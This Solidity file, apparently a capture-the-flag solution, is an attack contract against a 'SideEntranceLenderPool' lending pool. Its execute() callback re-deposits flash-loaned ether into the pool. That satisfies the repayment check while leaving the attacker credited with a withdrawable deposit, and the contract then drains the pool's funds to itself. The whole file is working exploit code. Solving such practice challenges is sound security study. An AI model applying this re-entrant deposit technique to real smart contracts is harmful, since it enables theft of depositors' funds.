pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
// Can write an interface to reduce size of file and use "Interface(msg.sender)"

import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

contract Challenge4Attack {
    SideEntranceLenderPool private pool;
    using Address for address payable;

    uint256 deposit_amount;

    constructor(address poolAddress) public {
        pool = SideEntranceLenderPool(poolAddress);
    }

    function deposit() external payable {
        deposit_amount += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = address(this).balance;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function withdrawFromPool() external {
        pool.withdraw();
    }

    function execute() external payable {
        deposit_amount += msg.value;
        pool.deposit{value: deposit_amount}();
    }

    receive () external payable {}
}